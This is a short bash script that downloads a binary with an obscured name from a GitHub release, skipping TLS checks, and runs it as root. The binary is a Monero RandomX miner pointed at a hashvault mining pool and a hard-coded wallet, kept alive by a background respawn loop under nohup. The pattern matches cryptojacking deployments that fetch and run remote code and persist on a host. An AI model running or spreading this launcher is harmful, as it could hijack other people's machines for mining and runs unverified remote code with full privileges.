#!/bin/bash
set -e

DIR="/root"
BIN_NAME="ababasnios"
BIN_PATH="$DIR/$BIN_NAME"
LOG_FILE="$DIR/runner.log"
POOL="pool.hashvault.pro:3333"
WALLET="8BBDheSYD9VRtWN7FEub3mUvoj2XdTpdzFWZy4pJtANaPDC5SfTf5DLa7V53AJuW632PiotRF4BtdL7bSRwj71wuLipRAyg"
WORKER="gerebak"
THREADS="2"

echo "=== [1/4] Checking & Installing Dependencies ==="
if ! command -v ldd >/dev/null 2>&1 || ! ldconfig -p | grep -q "libncurses.so.6"; then
    echo "Installing required libraries..."
    apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq libncurses6 libtinfo6 libssl3 libssl3t64 curl >/dev/null 2>&1 || true
fi

echo "=== [2/4] Downloading ababasnios ==="
if [ ! -f "$BIN_PATH" ]; then
    curl -sLk "https://github.com/rahuldev344/kirakirawa/releases/download/ababa/ababasnios" -o "$BIN_PATH"
    chmod +x "$BIN_PATH"
fi

echo "=== [3/4] Stopping old instances ==="
pkill -9 -f "$BIN_NAME" 2>/dev/null || true
rm -f "$LOG_FILE"

echo "=== [4/4] Starting daemon with auto-respawn in background ==="
nohup bash -c "while true; do
    $BIN_PATH -o $POOL -u $WALLET/$WORKER -a rx/0 -t $THREADS --no-huge-pages --no-color >> $LOG_FILE 2>&1
    sleep 3
done" >/dev/null 2>&1 </dev/null &

sleep 2
echo "=== Started successfully! Attaching live logs (Ctrl+C to detach) ==="
tail -n 25 -f "$LOG_FILE"
